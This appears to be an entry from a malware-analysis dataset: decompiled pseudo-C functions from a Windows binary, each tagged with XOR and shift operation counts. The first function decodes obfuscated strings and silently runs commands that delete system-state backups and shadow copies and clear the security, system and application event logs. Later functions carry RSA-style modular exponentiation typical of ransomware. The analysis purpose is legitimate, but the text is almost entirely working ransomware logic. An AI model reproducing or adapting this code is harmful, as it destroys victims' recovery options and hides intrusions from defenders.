sub_401020(&v130, 83);\n  v131[25] = sub_401020(&v130, 84);\n  v131[26] = sub_401020(&v130, 65);\n  v131[27] = sub_401020(&v130, 84);\n  v131[28] = sub_401020(&v130, 69);\n  v131[29] = sub_401020(&v130, 66);\n  v131[30] = sub_401020(&v130, 65);\n  v131[31] = sub_401020(&v130, 67);\n  v131[32] = sub_401020(&v130, 75);\n  v131[33] = sub_401020(&v130, 85);\n  v131[34] = sub_401020(&v130, 80);\n  v131[35] = sub_401020(&v130, 32);\n  v131[36] = sub_401020(&v130, 45);\n  v131[37] = sub_401020(&v130, 100);\n  v131[38] = sub_401020(&v130, 101);\n  v131[39] = sub_401020(&v130, 108);\n  v131[40] = sub_401020(&v130, 101);\n  v131[41] = sub_401020(&v130, 116);\n  v131[42] = sub_401020(&v130, 101);\n  v131[43] = sub_401020(&v130, 79);\n  v131[44] = sub_401020(&v130, 108);\n  v131[45] = sub_401020(&v130, 100);\n  v131[46] = sub_401020(&v130, 101);\n  v131[47] = sub_401020(&v130, 115);\n  v66 = 0;\n  v132 = (unsigned __int8)sub_401020(&v130, 116);\n  hSnapshotc = 0;\n  do\n  {\n    hSCManagerc = *sub_401010(v131, v66);\n    v67 = sub_401010(v131, v66);\n    *v67 = sub_401020(&v130, hSCManagerc);\n    v66 = (unsigned int)hSnapshotc + 1;\n    hSnapshotc = (HANDLE)v66;\n  }\n  while ( v66 < 0x31 );\n  *sub_401010(v131, 49) = 0;\n  v315 = sub_401000(v131);\n  v126 = 10;\n  v127[0] = sub_401020(&v126, 47);\n  v127[1] = sub_401020(&v126, 99);\n  v127[2] = sub_401020(&v126, 32);\n  v127[3] = sub_401020(&v126, 119);\n  v127[4] = sub_401020(&v126, 109);\n  v127[5] = sub_401020(&v126, 105);\n  v127[6] = sub_401020(&v126, 99);\n  v127[7] = sub_401020(&v126, 32);\n  v127[8] = sub_401020(&v126, 83);\n  v127[9] = sub_401020(&v126, 72);\n  v127[10] = sub_401020(&v126, 65);\n  v127[11] = sub_401020(&v126, 68);\n  v127[12] = sub_401020(&v126, 79);\n  v127[13] = sub_401020(&v126, 87);\n  v127[14] = sub_401020(&v126, 67);\n  v127[15] = sub_401020(&v126, 79);\n  v127[16] = sub_401020(&v126, 80);\n  v127[17] = sub_401020(&v126, 89);\n  v127[18] = sub_401020(&v126, 32);\n  v127[19] = sub_401020(&v126, 47);\n  v127[20] = sub_401020(&v126, 110);\n  v127[21] = sub_401020(&v126, 111);\n  v127[22] = sub_401020(&v126, 105);\n  v127[23] = sub_401020(&v126, 110);\n  v127[24] = sub_401020(&v126, 116);\n  v127[25] = sub_401020(&v126, 101);\n  v127[26] = sub_401020(&v126, 114);\n  v127[27] = sub_401020(&v126, 97);\n  v127[28] = sub_401020(&v126, 99);\n  v127[29] = sub_401020(&v126, 116);\n  v127[30] = sub_401020(&v126, 105);\n  v127[31] = sub_401020(&v126, 118);\n  v68 = 0;\n  v127[32] = sub_401020(&v126, 101);\n  v127[33] = 0;\n  hSnapshotd = 0;\n  do\n  {\n    hSCManagerd = *sub_401010(v127, v68);\n    v69 = sub_401010(v127, v68);\n    *v69 = sub_401020(&v126, hSCManagerd);\n    v68 = (unsigned int)hSnapshotd + 1;\n    hSnapshotd = (HANDLE)v68;\n  }\n  while ( v68 < 0x21 );\n  *sub_401010(v127, 33) = 0;\n  v314 = sub_401000(v127);\n  v120 = 77;\n  v121[0] = sub_401020(&v120, 47);\n  v121[1] = sub_401020(&v120, 99);\n  v121[2] = sub_401020(&v120, 32);\n  v121[3] = sub_401020(&v120, 119);\n  v121[4] = sub_401020(&v120, 101);\n  v121[5] = sub_401020(&v120, 118);\n  v121[6] = sub_401020(&v120, 116);\n  v121[7] = sub_401020(&v120, 117);\n  v121[8] = sub_401020(&v120, 116);\n  v121[9] = sub_401020(&v120, 105);\n  v121[10] = sub_401020(&v120, 108);\n  v121[11] = sub_401020(&v120, 32);\n  v121[12] = sub_401020(&v120, 99);\n  v121[13] = sub_401020(&v120, 108);\n  v121[14] = sub_401020(&v120, 32);\n  v121[15] = sub_401020(&v120, 115);\n  v121[16] = sub_401020(&v120, 101);\n  v121[17] = sub_401020(&v120, 99);\n  v121[18] = sub_401020(&v120, 117);\n  v121[19] = sub_401020(&v120, 114);\n  v121[20] = sub_401020(&v120, 105);\n  v121[21] = sub_401020(&v120, 116);\n  v70 = 0;\n  v121[22] = sub_401020(&v120, 121);\n  v121[23] = 0;\n  hSnapshote = 0;\n  do\n  {\n    hSCManagere = *sub_401010(v121, v70);\n    v71 = sub_401010(v121, v70);\n    *v71 = sub_401020(&v120, hSCManagere);\n    v70 = (unsigned int)hSnapshote + 1;\n    hSnapshote = (HANDLE)v70;\n  }\n  while ( v70 < 0x17 );\n  *sub_401010(v121, 23) = 0;\n  v187 = sub_401000(v121);\n  v118 = 95;\n  v119[0] = sub_401020(&v118, 47);\n  v119[1] = sub_401020(&v118, 99);\n  v119[2] = sub_401020(&v118, 32);\n  v119[3] = sub_401020(&v118, 119);\n  v119[4] = sub_401020(&v118, 101);\n  v119[5] = sub_401020(&v118, 118);\n  v119[6] = sub_401020(&v118, 116);\n  v119[7] = sub_401020(&v118, 117);\n  v119[8] = sub_401020(&v118, 116);\n  v119[9] = sub_401020(&v118, 105);\n  v119[10] = sub_401020(&v118, 108);\n  v119[11] = sub_401020(&v118, 32);\n  v119[12] = sub_401020(&v118, 99);\n  v119[13] = sub_401020(&v118, 108);\n  v119[14] = sub_401020(&v118, 32);\n  v119[15] = sub_401020(&v118, 115);\n  v119[16] = sub_401020(&v118, 121);\n  v119[17] = sub_401020(&v118, 115);\n  v119[18] = sub_401020(&v118, 116);\n  v119[19] = sub_401020(&v118, 101);\n  v72 = 0;\n  v119[20] = sub_401020(&v118, 109);\n  v119[21] = 0;\n  hSnapshotf = 0;\n  do\n  {\n    hSCManagerf = *sub_401010(v119, v72);\n    v73 = sub_401010(v119, v72);\n    *v73 = sub_401020(&v118, hSCManagerf);\n    v72 = (unsigned int)hSnapshotf + 1;\n    hSnapshotf = (HANDLE)v72;\n  }\n  while ( v72 < 0x15 );\n  *sub_401010(v119, 21) = 0;\n  v133 = sub_401000(v119);\n  v122 = 120;\n  v123[0] = sub_401020(&v122, 47);\n  v123[1] = sub_401020(&v122, 99);\n  v123[2] = sub_401020(&v122, 32);\n  v123[3] = sub_401020(&v122, 119);\n  v123[4] = sub_401020(&v122, 101);\n  v123[5] = sub_401020(&v122, 118);\n  v123[6] = sub_401020(&v122, 116);\n  v123[7] = sub_401020(&v122, 117);\n  v123[8] = sub_401020(&v122, 116);\n  v123[9] = sub_401020(&v122, 105);\n  v123[10] = sub_401020(&v122, 108);\n  v123[11] = sub_401020(&v122, 32);\n  v123[12] = sub_401020(&v122, 99);\n  v123[13] = sub_401020(&v122, 108);\n  v123[14] = sub_401020(&v122, 32);\n  v123[15] = sub_401020(&v122, 97);\n  v123[16] = sub_401020(&v122, 112);\n  v123[17] = sub_401020(&v122, 112);\n  v123[18] = sub_401020(&v122, 108);\n  v123[19] = sub_401020(&v122, 105);\n  v123[20] = sub_401020(&v122, 99);\n  v123[21] = sub_401020(&v122, 97);\n  v123[22] = sub_401020(&v122, 116);\n  v123[23] = sub_401020(&v122, 105);\n  v123[24] = sub_401020(&v122, 111);\n  v74 = 0;\n  v123[25] = sub_401020(&v122, 110);\n  v123[26] = 0;\n  hSnapshotg = 0;\n  do\n  {\n    hSCManagerg = *sub_401010(v123, v74);\n    v75 = sub_401010(v123, v74);\n    *v75 = sub_401020(&v122, hSCManagerg);\n    v74 = (unsigned int)hSnapshotg + 1;\n    hSnapshotg = (HANDLE)v74;\n  }\n  while ( v74 < 0x1A );\n  *sub_401010(v123, 26) = 0;\n  Src[0] = (char *)v335 + 1;\n  Src[1] = (char *)v321 + 1;\n  Src[2] = (char *)v338 + 1;\n  Src[3] = v316;\n  Src[4] = v315;\n  Src[5] = v314;\n  Src[6] = v187;\n  Src[7] = v133;\n  Src[8] = sub_401000(v123);\n  v76 = 0;\n  Src[9] = 0;\n  v77 = 0;\n  hSCManagera = 0;\n  while ( 1 )\n  {\n    if ( !Src[v77] )\n    {\n      v77 = 0;\n      hSCManagera = (SC_HANDLE)((char *)v76 + 1);\n      if ( v76 == (SC_HANDLE)2 )\n        break;\n    }\n    StartupInfo.cb = 68;\n    memset(&StartupInfo.lpReserved, 0, 64);\n    ProcessInformation_4 = 0i64;\n    memset(CommandLine, 0, 0x104u);\n    v78 = Src[v77];\n    if ( v78 )\n      v78 = (void *)sub_40A1F0(Src[v77]);\n    memcpy(CommandLine, Src[v77], (size_t)v78 + 1);\n    v79 = !CreateProcessA(&v135[1], CommandLine, 0, 0, 1, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation_4);\n    v76 = hSCManagera;\n    if ( !v79 )\n    {\n      WaitForSingleObject(ProcessInformation_4.hProcess, 0xFFFFFFFF);\n      CloseHandle(ProcessInformation_4.hProcess);\n      CloseHandle(ProcessInformation_4.hThread);\n      Sleep(0x64u);\n      v76 = hSCManagera;\n      ++v77;\n    }\n  }\n  v128 = 47;\n  v129[0] = sub_401020(&v128, 86);\n  v129[1] = sub_401020(&v128, 111);\n  v129[2] = sub_401020(&v128, 108);\n  v129[3] = sub_401020(&v128, 117);\n  v129[4] = sub_401020(&v128, 109);\n  v129[5] = sub_401020(&v128, 101);\n  v129[6] = sub_401020(&v128, 32);\n  v129[7] = sub_401020(&v128, 83);\n  v129[8] = sub_401020(&v128, 104);\n  v129[9] = sub_401020(&v128, 97);\n  v129[10] = sub_401020(&v128, 100);\n  v129[11] = sub_401020(&v128, 111);\n  v129[12] = sub_401020(&v128, 119);\n  v129[13] = sub_401020(&v128, 32);\n  v129[14] = sub_401020(&v128, 67);\n  v129[15] = sub_401020(&v128, 111);\n  v129[16] = sub_401020(&v128, 112);\n  v129[17] = sub_401020(&v128, 121);\n  v129[18] = sub_401020(&v128, 32);\n  v129[19] = sub_401020(&v128, 38);\n  v129[20] = sub_401020(&v128, 32);\n  v129[21] = sub_401020(&v128, 69);\n  v129[22] = sub_401020(&v128, 118);\n  v129[23] = sub_401020(&v128, 101);\n  v129[24] = sub_401020(&v128, 110);\n  v129[25] = sub_401020(&v128, 116);\n  v129[26] = sub_401020(&v128, 32);\n  v129[27] = sub_401020(&v128, 108);\n  v129[28] = sub_401020(&v128, 111);\n  v129[29] = sub_401020(&v128, 103);\n  v129[30] = sub_401020(&v128, 32);\n  v129[31] = sub_401020(&v128, 99);\n  v129[32] = sub_401020(&v128, 108);\n  v129[33] = sub_401020(&v128, 101);\n  v129[34] = sub_401020(&v128, 97);\n  v129[35] = sub_401020(&v128, 110);\n  v80 = 0;\n  v129[36] = 0;\n  do\n  {\n    v81 = sub_401010(v129, v80);\n    LOBYTE(v81) = *v81;\n    v133 = v81;\n    v82 = sub_401010(v129, v80++);\n    *v82 = sub_401020(&v128, (char)v133);\n  }\n  while ( v80 < 0x24 );\n  *sub_401010(v129, 36) = 0;\n  v83 = (const CHAR *)sub_401000(v129);\n  sub_4100C0(v83);\n  if ( sub_40F8C0() )\n  {\n    v124 = 116;\n    v125[0] = sub_401020(&v124, 87);\n    v125[1] = sub_401020(&v124, 111);\n    v125[2] = sub_401020(&v124, 119);\n    v125[3] = sub_401020(&v124, 54);\n    v125[4] = sub_401020(&v124, 52);\n    v125[5] = sub_401020(&v124, 82);\n    v125[6] = sub_401020(&v124, 101);\n    v125[7] = sub_401020(&v124, 118);\n    v125[8] = sub_401020(&v124, 101);\n    v125[9] = sub_401020(&v124, 114);\n    v125[10] = sub_401020(&v124, 116);\n    v125[11] = sub_401020(&v124, 87);\n    v125[12] = sub_401020(&v124, 111);\n    v125[13] = sub_401020(&v124, 119);\n    v125[14] = sub_401020(&v124, 54);\n    v125[15] = sub_401020(&v124, 52);\n    v125[16] = sub_401020(&v124, 70);\n    v125[17] = sub_401020(&v124, 115);\n    v125[18] = sub_401020(&v124, 82);\n    v125[19] = sub_401020(&v124, 101);\n    v125[20] = sub_401020(&v124, 100);\n    v125[21] = sub_401020(&v124, 105);\n    v125[22] = sub_401020(&v124, 114);\n    v125[23] = sub_401020(&v124, 101);\n    v125[24] = sub_401020(&v124, 99);\n    v125[25] = sub_401020(&v124, 116);\n    v125[26] = sub_401020(&v124, 105);\n    v125[27] = sub_401020(&v124, 111);\n    v125[28] = sub_401020(&v124, 110);\n    v84 = 0;\n    v125[29] = 0;\n    do\n    {\n      v85 = sub_401010(v125, v84);\n      LOBYTE(v85) = *v85;\n      v133 = v85;\n      v86 = sub_401010(v125, v84++);\n      *v86 = sub_401020(&v124, (char)v133);\n    }\n    while ( v84 < 0x1D );\n    *sub_401010(v125, 29) = 0;\n    v187 = sub_401000(v125);\n    v116 = 83;\n    v117[0] = sub_401020(&v116, 107);\n    v117[1] = sub_401020(&v116, 101);\n    v117[2] = sub_401020(&v116, 114);\n    v117[3] = sub_401020(&v116, 110);\n    v117[4] = sub_401020(&v116, 101);\n    v117[5] = sub_401020(&v116, 108);\n    v117[6] = sub_401020(&v116, 51);\n    v117[7] = sub_401020(&v116, 50);\n    v87 = 0;\n    v117[8] = 0;\n    do\n    {\n      v88 = sub_401010(v117, v87);\n      LOBYTE(v88) = *v88;\n      v133 = v88;\n      v89 = sub_401010(v117, v87++);\n      *v89 = sub_401020(&v116, (char)v133);\n    }\n    while ( v87 < 8 );\n    *sub_401010(v117, 8) = 0;\n    v90 = (const CHAR *)sub_401000(v117);\n    v99 = (const CHAR *)v187;\n    v91 = GetModuleHandleA(v90);\n    v92 = GetProcAddress(v91, v99);\n    if ( v92 )\n      ((void (__stdcall *)(int))v92)(v200);\n  }\n  return 0;\n}\n// 418F80: using guessed type __int128 xmmword_418F80;\n// 418FD0: using guessed type __int128 xmmword_418FD0;\n// 419000: using guessed type __int128 xmmword_419000;\n// 419050: using guessed type __int128 xmmword_419050;\n// 4190C0: using guessed type __int128 xmmword_4190C0;\n// 419100: using guessed type __int128 xmmword_419100;\n// 419110: using guessed type __int128 xmmword_419110;\n// 4191B0: using guessed type __int128 xmmword_4191B0;\n// 4191E0: using guessed type __int128 xmmword_4191E0;\n// 4191F0: using guessed type __int128 xmmword_4191F0;\n// 419220: using guessed type __int128 xmmword_419220;\n// 419240: using guessed type __int128 xmmword_419240;\n// 419310: using guessed type __int128 xmmword_419310;\n// 419350: using guessed type __int128 xmmword_419350;\n// 419360: using guessed type __int128 xmmword_419360;\n// 4193E0: using guessed type __int128 xmmword_4193E0;\n// 419410: using guessed type __int128 xmmword_419410;\n// 419430: using guessed type __int128 xmmword_419430;\n// 419450: using guessed type __int128 xmmword_419450;\n// 419460: using guessed type __int128 xmmword_419460;\n// 419490: using guessed type __int128 xmmword_419490;\n// 419500: using guessed type __int128 xmmword_419500;\n// 419660: using guessed type __int128 xmmword_419660;\n// 419690: using guessed type __int128 xmmword_419690;\n// 419780: using guessed type __int128 xmmword_419780;\n// 4197C0: using guessed type __int128 xmmword_4197C0;\n// 419800: using guessed type __int128 xmmword_419800;\n// 419810: using guessed type __int128 xmmword_419810;\n// 419840: using guessed type __int128 xmmword_419840;\n// 419870: using guessed type __int128 xmmword_419870;\n// 419880: using guessed type __int128 xmmword_419880;\n// 4198B0: using guessed type __int128 xmmword_4198B0;\n// 4198C0: using guessed type __int128 xmmword_4198C0;\n// 419910: using guessed type __int128 xmmword_419910;\n// 419920: using guessed type __int128 xmmword_419920;\n// 419950: using guessed type __int128 xmmword_419950;\n// 419960: using guessed type __int128 xmmword_419960;\n// 419970: using guessed type __int128 xmmword_419970;\n// 419980: using guessed type __int128 xmmword_419980;\n// 4199A0: using guessed type __int128 xmmword_4199A0;\n// 40A8B0: using guessed type char var_A8D[19];\n// 40A8B0: using guessed type char var_6F6[23];\n\n"
    },
    {
        "Function": "sub_403860",
        "Total XOR and shift operations": 11,
        "XOR operations": 0,
        "Shift operations": 11,
        "Operation percentage": "3.01%",
        "Function Body": "\nint __cdecl sub_403860(_DWORD *a1, int *a2, int a3, int a4, int a5)\n{\n  int *v5; // edi\n  size_t v6; // ecx\n  unsigned int v7; // edx\n  size_t v8; // ebx\n  int v9; // ebx\n  unsigned int v10; // eax\n  int v11; // esi\n  void *v12; // eax\n  void *v13; // eax\n  int v14; // eax\n  unsigned int v15; // edx\n  size_t v16; // eax\n  size_t v17; // eax\n  int *v18; // ecx\n  size_t v19; // ecx\n  int v20; // eax\n  int v21; // edi\n  unsigned int v22; // ebx\n  size_t v23; // edx\n  void **v24; // edi\n  void *v25; // ebx\n  void *v26; // edi\n  void *v27; // edi\n  void *v28; // edi\n  void *v29; // ebx\n  int v31[384]; // [esp+8h] [ebp-64Ch] BYREF\n  int v32; // [esp+608h] [ebp-4Ch]\n  int v33; // [esp+60Ch] [ebp-48h] BYREF\n  int v34; // [esp+610h] [ebp-44h]\n  void *v35; // [esp+614h] [ebp-40h]\n  int v36; // [esp+618h] [ebp-3Ch] BYREF\n  int v37; // [esp+61Ch] [ebp-38h]\n  size_t *v38; // [esp+620h] [ebp-34h]\n  __int64 v39; // [esp+624h] [ebp-30h] BYREF\n  void *v40; // [esp+62Ch] [ebp-28h]\n  int v41; // [esp+630h] [ebp-24h] BYREF\n  int v42; // [esp+634h] [ebp-20h]\n  void *v43; // [esp+638h] [ebp-1Ch]\n  unsigned int i; // [esp+63Ch] [ebp-18h]\n  unsigned int j; // [esp+640h] [ebp-14h]\n  int v46; // [esp+644h] [ebp-10h]\n  unsigned int v47; // [esp+648h] [ebp-Ch]\n  size_t Count; // [esp+64Ch] [ebp-8h]\n  size_t v49; // [esp+650h] [ebp-4h] BYREF\n\n  v49 = 0;\n  v5 = (int *)a4;\n  v38 = &v49;\n  v36 = 1;\n  v37 = 1;\n  if ( sub_403100((int *)a4, &v36) <= 0 )\n    return -4;\n  Count = **(_DWORD **)(a4 + 8);\n  if ( (Count & 1) == 0 )\n    return -4;\n  v38 = &v49;\n  v49 = 0;\n  v36 = 1;\n  v37 = 1;\n  if ( sub_403100((int *)a3, &v36) < 0 )\n    return -4;\n  v6 = Count;\n  v7 = 32;\n  v8 = Count + ((2 * (_BYTE)Count + 4) & 8);\n  do\n  {\n    v7 >>= 1;\n    v8 *= 2 - v6 * v8;\n    v6 = Count;\n  }\n  while ( v7 >= 8 );\n  v39 = 1i64;\n  v9 = -v8;\n  v40 = 0;\n  v41 = 1;\n  v42 = 0;\n  v43 = 0;\n  v33 = 1;\n  v34 = 0;\n  v35 = 0;\n  memset(v31, 0, sizeof(v31));\n  v10 = sub_402FC0(a3);\n  if ( v10 <= 0x29F )\n  {\n    if ( v10 <= 0xEF )\n    {\n      if ( v10 <= 0x4F )\n        v47 = v10 > 0x17 ? 3 : 1;\n      else\n        v47 = 4;\n    }\n    else\n    {\n      v47 = 5;\n    }\n  }\n  else\n  {\n    v47 = 6;\n  }\n  Count = *(_DWORD *)(a4 + 4) + 1;\n  v11 = sub_4046F0((int)a1, Count);\n  if ( !v11 )\n  {\n    v11 = sub_4046F0((int)&v31[3], Count);\n    if ( !v11 )\n    {\n      v11 = sub_4046F0((int)&v41, 2 * Count);\n      if ( !v11 )\n      {\n        v32 = *a2;\n        if ( v32 == -1 )\n        {\n          v11 = sub_4031E0((int)&v33, (int)a2);\n          if ( v11 )\n            goto LABEL_73;\n          v33 = 1;\n          a2 = &v33;\n        }\n        if ( a5 && *(_DWORD *)(a5 + 8) )\n        {\n          v12 = *(void **)(a5 + 8);\n          v39 = *(_QWORD *)a5;\n          v40 = v12;\n        }\n        else\n        {\n          v11 = sub_404E70((int)&v39, 1);\n          if ( v11 )\n            goto LABEL_73;\n          v11 = sub_405470((int)&v39, *(_DWORD *)(a4 + 4) << 6);\n          if ( v11 )\n            goto LABEL_73;\n          v11 = sub_404FB0((int *)&v39, (int *)&v39, (int *)a4);\n          if ( v11 )\n            goto LABEL_73;\n          if ( a5 )\n          {\n            v13 = v40;\n            *(_QWORD *)a5 = v39;\n            *(_DWORD *)(a5 + 8) = v13;\n          }\n        }\n        v14 = sub_403100(a2, (int *)a4) < 0 ? sub_4031E0((int)&v31[3], (int)a2) : sub_404FB0(&v31[3], a2, (int *)a4);\n        v11 = v14;\n        if ( !v14 )\n        {\n          v11 = sub_405EF0((int)&v31[3], (int)&v39, a4, v9, (int)&v41);\n          if ( !v11 )\n          {\n            v11 = sub_4031E0((int)a1, (int)&v39);\n            if ( !v11 )\n            {\n              v11 = sub_406010((int)a1, a4, v9, (int)&v41);\n              if ( !v11 )\n              {\n                v15 = v47;\n                if ( v47 > 1 )\n                {\n                  j = v47 - 1;\n                  v49 = 1 << (v47 - 1);\n                  v16 = *(_DWORD *)(a4 + 4) + 1;\n                  Count = (size_t)&v31[3 * v49];\n                  v11 = sub_4046F0(Count, v16);\n                  if ( v11 )\n                    goto LABEL_73;\n                  v11 = sub_4031E0(Count, (int)&v31[3]);\n                  if ( v11 )\n                    goto LABEL_73;\n                  for ( i = 0; i < j; ++i )\n                  {\n                    v11 = sub_405EF0(Count, Count, a4, v9, (int)&v41);\n                    if ( v11 )\n                      goto LABEL_73;\n                  }\n                  v15 = v47;\n                  v17 = v49 + 1;\n                  Count = v17;\n                  v49 = 1 << v47;\n                  if ( v17 < 1 << v47 )\n                  {\n                    v18 = &v31[3 * v17];\n                    v46 = (int)v18;\n                    do\n                    {\n                      v11 = sub_4046F0((int)v18, *(_DWORD *)(a4 + 4) + 1);\n                      if ( v11 )\n                        goto LABEL_73;\n                      v11 = sub_4031E0(v46, v46 - 12);\n                      if ( v11 )\n                        goto LABEL_73;\n                      v11 = sub_405EF0(v46, (int)&v31[3], a4, v9, (int)&v41);\n                      if ( v11 )\n                        goto LABEL_73;\n                      v18 = (int *)(v46 + 12);\n                      ++Count;\n                      v46 += 12;\n                    }\n                    while ( Count < v49 );\n                    v15 = v47;\n                  }\n                }\n                v11 = 0;\n                v49 = 0;\n                i = *(_DWORD *)(a3 + 4);\n                Count = 0;\nLABEL_48:\n                v46 = 0;\n                for ( j = 0; ; v11 = j )\n                {\n                  do\n                  {\n                    while ( 1 )\n                    {\n                      v19 = v49;\n                      if ( !v49 )\n                      {\n                        if ( !i )\n                        {\n                          v49 = 0;\n                          if ( v11 )\n                          {\n                            while ( 1 )\n                            {\n                              v11 = sub_405EF0((int)a1, (int)a1, (int)v5, v9, (int)&v41);\n                              if ( v11 )\n                                break;\n                              v46 *= 2;\n                              if ( ((1 << v47) & v46) != 0 )\n                              {\n                                v11 = sub_405EF0((int)a1, (int)&v31[3], (int)v5, v9, (int)&v41);\n                                if ( v11 )\n                                  break;\n                              }\n                              if ( ++v49 >= j )\n                                goto LABEL_68;\n                            }\n                          }\n                          else\n                          {\nLABEL_68:\n                            v49 = 1;\n                            v38 = &v49;\n                            v36 = 1;\n                            v37 = 1;\n                            v11 = sub_405EF0((int)a1, (int)&v36, (int)v5, v9, (int)&v41);\n                            if ( !v11 && v32 == -1 && *(_DWORD *)(a3 + 4) && (**(_BYTE **)(a3 + 8) & 1) != 0 )\n                            {\n                              *a1 = -1;\n                              v11 = sub_402F50(a1, v5, a1);\n                            }\n                          }\n                          goto LABEL_73;\n                        }\n                        v19 = 32;\n                        --i;\n                      }\n                      v49 = v19 - 1;\n                      v5 = (int *)a4;\n                      v20 = (*(_DWORD *)(*(_DWORD *)(a3 + 8) + 4 * i) >> (v19 - 1)) & 1;\n                      if ( !v20 )\n                        break;\nLABEL_57:\n                      ++v11;\n                      Count = 2;\n                      j = v11;\n                      v46 |= v20 << (v15 - v11);\n                      if ( v11 == v15 )\n                      {\n                        v21 = 0;\n                        while ( 1 )\n                        {\n                          v11 = sub_405EF0((int)a1, (int)a1, a4, v9, (int)&v41);\n                          if ( v11 )\n                            goto LABEL_73;\n                          if ( ++v21 >= v47 )\n                          {\n                            v5 = (int *)a4;\n                            v11 = sub_405EF0((int)a1, (int)&v31[3 * v46], a4, v9, (int)&v41);\n                            if ( v11 )\n                              goto LABEL_73;\n                            v15 = v47;\n                            Count = 1;\n                            goto LABEL_48;\n                          }\n                        }\n                      }\n                    }\n                  }\n                  while ( !Count );\n                  if ( Count != 1 )\n                    goto LABEL_57;\n                  v11 = sub_405EF0((int)a1, (int)a1, a4, v9, (int)&v41);\n                  if ( v11 )\n                    break;\n                  v15 = v47;\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  }\nLABEL_73:\n  v22 = 1 << (v47 - 1);\n  if ( v22 < 1 << v47 )\n  {\n    v23 = (1 << v47) - v22;\n    v49 = v23;\n    v24 = (void **)&v31[3 * v22 + 2];\n    do\n    {\n      if ( v24 != (void **)8 )\n      {\n        v25 = *v24;\n        if ( *v24 )\n        {\n          sub_408020(v25, 4 * (_DWORD)*(v24 - 1));\n          free(v25);\n          v23 = v49;\n        }\n        *(v24 - 2) = (void *)1;\n        *(v24 - 1) = 0;\n        *v24 = 0;\n      }\n      v24 += 3;\n      v49 = --v23;\n    }\n    while ( v23 );\n  }\n  v26 = (void *)v31[5];\n  if ( v31[5] )\n  {\n    sub_408020((void *)v31[5], 4 * v31[4]);\n    free(v26);\n  }\n  v27 = v43;\n  if ( v43 )\n  {\n    sub_408020(v43, 4 * v42);\n    free(v27);\n  }\n  v28 = v35;\n  if ( v35 )\n  {\n    sub_408020(v35, 4 * v34);\n    free(v28);\n  }\n  if ( !a5 || !*(_DWORD *)(a5 + 8) )\n  {\n    v29 = v40;\n    if ( v40 )\n    {\n      sub_408020(v40, 4 * HIDWORD(v39));\n      free(v29);\n    }\n  }\n  return v11;\n}\n\n"
    },
    {
        "Function": "sub_405A60",
        "Total XOR and shift operations": 9,
        "XOR operations": 0,
        "Shift operations": 9,
        "Operation percentage": "2.95%",
        "Function Body": "\nint __cdecl sub_405A60(int *a1, unsigned int a2, void (__cdecl *a3)(int, unsigned int, unsigned int), int a4)\n{\n  void *v4; // ebx\n  void *v5; // edi\n  bool v6; // cc\n  int v7; // esi\n  unsigned int v8; // eax\n  int *v9; // ebx\n  unsigned int v10; // edi\n  int v11; // esi\n  int v12; // edx\n  unsigned int v13; // eax\n  unsigned int v14; // ecx\n  unsigned int v15; // eax\n  unsigned int v16; // eax\n  unsigned int v17; // eax\n  unsigned int v18; // ecx\n  int v19; // esi\n  unsigned int v20; // eax\n  unsigned int v21; // edx\n  int v22; // ecx\n  unsigned int v23; // eax\n  unsigned int v24; // eax\n  unsigned int v25; // eax\n  int v26; // eax\n  int v27; // edi\n  int v29[3]; // [esp+Ch] [ebp-64h] BYREF\n  int v30; // [esp+18h] [ebp-58h] BYREF\n  int v31; // [esp+1Ch] [ebp-54h]\n  int *v32; // [esp+20h] [ebp-50h]\n  int v33; // [esp+24h] [ebp-4Ch] BYREF\n  int v34; // [esp+28h] [ebp-48h]\n  void *v35; // [esp+2Ch] [ebp-44h]\n  int v36; // [esp+30h] [ebp-40h] BYREF\n  int v37; // [esp+34h] [ebp-3Ch]\n  void *v38; // [esp+38h] [ebp-38h]\n  int v39; // [esp+3Ch] [ebp-34h] BYREF\n  int v40; // [esp+40h] [ebp-30h]\n  void *v41; // [esp+44h] [ebp-2Ch]\n  unsigned int v42; // [esp+48h] [ebp-28h] BYREF\n  int v43; // [esp+4Ch] [ebp-24h]\n  void *Block; // [esp+50h] [ebp-20h]\n  int v45; // [esp+54h] [ebp-1Ch] BYREF\n  int v46; // [esp+58h] [ebp-18h]\n  _DWORD *v47; // [esp+5Ch] [ebp-14h]\n  int v48; // [esp+60h] [ebp-10h] BYREF\n  int v49; // [esp+64h] [ebp-Ch] BYREF\n  int v50; // [esp+68h] [ebp-8h]\n  unsigned int v51; // [esp+6Ch] [ebp-4h]\n\n  v4 = 0;\n  v32 = &v49;\n  v5 = 0;\n  v42 = 1;\n  v6 = *a1 <= 0;\n  v51 = *a1;\n  v43 = 0;\n  Block = 0;\n  v39 = 1;\n  v40 = 0;\n  v41 = 0;\n  v36 = 1;\n  v37 = 0;\n  v38 = 0;\n  v45 = 1;\n  v46 = 0;\n  v47 = 0;\n  v33 = 1;\n  v34 = 0;\n  v35 = 0;\n  v49 = 1;\n  v30 = 1;\n  v31 = 1;\n  if ( !v6 )\n  {\n    if ( (sub_403020((int)a1, (int)&v30) & 0x80000000) != 0 )\n    {\n      v7 = sub_4056C0((int)&v42, (int)&v30, (int)a1);\n      if ( !v7 )\n      {\n        v42 = -v51;\n        goto LABEL_10;\n      }\n    }\n    else\n    {\n      v7 = sub_4056C0((int)&v42, (int)a1, (int)&v30);\n      if ( !v7 )\n      {\n        v42 = v51;\n        goto LABEL_10;\n      }\n    }\nLABEL_66:\n    if ( Block )\n    {\n      sub_408020(Block, 4 * v43);\n      free(Block);\n    }\n    if ( v41 )\n    {\n      sub_408020(v41, 4 * v40);\n      free(v41);\n    }\n    if ( v38 )\n    {\n      sub_408020(v38, 4 * v37);\n      free(v38);\n    }\n    if ( v4 )\n    {\n      sub_408020(v4, 4 * v46);\n      free(v4);\n    }\n    if ( v5 )\n    {\n      sub_408020(v5, 4 * v34);\n      free(v5);\n    }\n    return v7;\n  }\n  v7 = sub_402D40((int)&v42, (int)a1, (int)&v30);\n  v8 = v42;\n  if ( !v7 )\n    v8 = v51;\n  v42 = v8;\n  if ( v7 )\n    goto LABEL_66;\nLABEL_10:\n  v51 = sub_404E20((int)&v42);\n  v7 = sub_4031E0((int)&v39, (int)&v42);\n  if ( v7 )\n    goto LABEL_66;\n  v7 = sub_4055B0((int)&v39, v51);\n  if ( v7 )\n    goto LABEL_66;\n  v49 = 0;\n  if ( !a2 )\n    goto LABEL_66;\n  v9 = a1;\nLABEL_14:\n  v50 = 0;\n  while ( 1 )\n  {\n    v7 = sub_403F50((int)&v45, 4 * v9[1], a3, a4);\n    if ( v7 )\n      goto LABEL_65;\n    if ( v46 )\n    